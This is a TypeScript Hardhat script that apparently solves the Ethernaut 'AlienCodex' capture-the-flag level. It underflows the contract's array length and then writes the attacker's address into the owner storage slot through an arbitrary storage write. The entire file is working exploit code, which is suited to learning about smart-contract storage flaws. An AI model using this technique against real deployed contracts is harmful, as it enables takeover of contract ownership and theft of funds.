import { fail } from "assert";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

async function alienCodexScript() {
  const alienCodexAddress = process.env.ALIEN_CODEX_ADDRESS || fail("ALIEN_CODEX_ADDRESS Not Fount In .env");
  const [attacker] = await ethers.getSigners();
  const alienCodex = await ethers.getContractAt("AlienCodex", alienCodexAddress);

  let tx = await alienCodex.makeContact();
  await tx.wait(1);

  tx = await alienCodex.retract();
  await tx.wait(1);

  const codexArrayLocation = "0x01";
  const codexSlotInHexPadded = ethers.utils.keccak256(ethers.utils.hexZeroPad(codexArrayLocation, 32));
  const codexBeginLocation = BigNumber.from(codexSlotInHexPadded);
  const ownerOffset = BigNumber.from(2).pow(256).sub(codexBeginLocation);

  console.log("Owner Before Hack :", await alienCodex.owner());

  const zeroPaddedAddress = ethers.utils.hexZeroPad(await attacker.getAddress(), 32);
  tx = await alienCodex.revise(ownerOffset, zeroPaddedAddress);
  await tx.wait(1);

  console.log("Owner After Hack :", await alienCodex.owner());

  console.log("SUCCESS!!! Submit the instance.");
}

alienCodexScript().catch((error) => {
  console.log(error);
  process.exitCode = 1;
});
